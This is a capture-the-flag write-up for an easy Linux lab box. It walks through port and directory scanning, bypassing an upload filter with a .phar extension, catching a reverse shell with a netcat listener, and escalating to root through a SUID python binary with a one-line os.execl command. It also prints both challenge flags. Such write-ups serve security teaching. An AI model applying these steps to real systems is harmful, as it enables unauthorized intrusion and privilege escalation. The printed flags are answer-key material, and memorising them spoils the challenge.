
**Target IP**: `10.10.155.129`  
**Difficulty**: Easy  
**Categories**: CTF, Linux, File Upload, Privilege Escalation

Recon
---------------------------------------------------------------------------

`sudo nmap -sC -sV -p- -T4 10.10.155.129 -vv`

Output-
`
~~~~~~~~~~
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-21 19:09 IST

Scanning 10.10.155.129 [65535 ports]
Discovered open port 22/tcp on 10.10.155.129
Discovered open port 80/tcp on 10.10.155.129


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


~~~~~~~~~~~~~~~

~~~~~~~~~~
Open ports:

- `22` – SSH
    
- `80` – Apache Web Server
~~~~~~~~~~~~~~~~

____________________________________

### Web Enumeration- Gobuster

`gobuster dir -u "http://10.10.155.129" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r`

Output-

~~~~~~~~~~~~~~~~~~~~~~~~
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.155.129
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 200) [Size: 744]
/css                  (Status: 200) [Size: 1126]
/js                   (Status: 200) [Size: 959]
/panel                (Status: 200) [Size: 732]
Progress: 8579 / 220561 (3.89%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8589 / 220561 (3.89%)
===============================================================
Finished
===============================================================

~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~
Discovered Paths

/uploads
/css
/js
/panel

~~~~~~~~~~~

The `/panel` directory appeared to be of particular interest.

___________________________

Exploitation
-----------------------------------

### **File Upload Vulnerability in `/panel`**

- Found a file upload feature in `/panel`.
    
- Standard `.php` shells were blocked.
    
- Tried common evasion techniques like `.jpg.php`, but failed.
    
- Bypassed filter using `.phar` extension.

____________________________________

### Reverse Shell Setup

`nc -lvnp 4444`  

~~~~~~~~~~~~~~~~~~~~~~
listening on [any] 4444 ...
connect to [10.17.44.125] from (UNKNOWN) [10.10.155.129] 36698
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:21:10 up 43 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data


~~~~~~~~~~~~~~~~~~~~~~~~~

________________________________________

### User Flag
~~~~~~~~~~~~

find / -name "user.txt" 2>/dev/null
/var/www/user.txt

$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}


~~~~~~~~~~~~


Privilege Escalation
--------------------------------------

### Find unusual SUID Binary -

`$ find / -type f -perm -04000 -ls 2>/dev/null`

~~~~~~~~~~~~~~~~~~~~~
   787696     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   787234    112 -rwsr-xr-x   1 root     root         113528 Jul 10  2020 /usr/lib/snapd/snap-confine
   918336    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   787659     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   787841    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   787845     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   787467     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   787290     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   787288     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   787086     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   266770   3580 -rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python
   787033     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
   787084     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
   787179     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
   787431    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
   787289     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
   787306     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
   787326     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
       66     40 -rwsr-xr-x   1 root     root          40152 Oct 10  2019 /snap/core/8268/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/8268/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/8268/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/8268/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Oct 10  2019 /snap/core/8268/bin/umount
     2665     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
     2667     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
     2743     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
     2835     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
     2848     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd

~~~~~~~~~~~~~~~~~~~~~~~~~~


Suspicious Entry Identified:

`/usr/bin/python -rwsr-sr-x 1 root root 3665768 Aug  4  2020`

A SUID-enabled `python` binary can be used to escalate privileges.

______________________________________

### Privilege Escalation Exploit

`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

Root access achieved.

~~~~~~~~~~~~
cd root

ls
root.txt

cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}

~~~~~~~~~~~~
